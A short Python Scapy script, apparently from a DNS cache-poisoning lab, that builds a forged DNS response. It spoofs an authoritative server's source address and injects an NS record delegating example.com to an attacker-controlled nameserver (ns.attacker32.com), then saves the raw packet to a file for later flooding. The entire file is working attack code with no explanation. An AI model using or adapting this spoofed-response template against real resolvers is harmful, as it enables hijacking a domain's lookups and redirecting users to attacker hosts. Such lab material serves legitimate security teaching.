from scapy.all import *
from scapy.layers.dns import DNSQR, DNSRR, DNS
from scapy.layers.inet import IP, UDP


ip = IP(src='199.43.135.53', dst='10.9.0.53', chksum=0)
udp = UDP(sport=53, dport=33333, chksum=0)

Qdsec = DNSQR(qname='shahr.example.com')
Anssec = DNSRR(rrname='shahr.example.com', type='A', rdata='1.4.3.7', ttl=259200)
NSsec = DNSRR(rrname='example.com', type='NS', rdata='ns.attacker32.com', ttl=259200)
dns = DNS(id=0xAAAA, aa=1, ra=0, rd=0, cd=0, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0, qd=Qdsec, an=Anssec,
          ns=NSsec)

# Construct the IP, UDP headers, and the entire packet
pkt = ip / udp / dns
# Save the packet to a file

with open('ip_resp.bin', 'wb') as f:
    f.write(bytes(pkt))
    pkt.show()
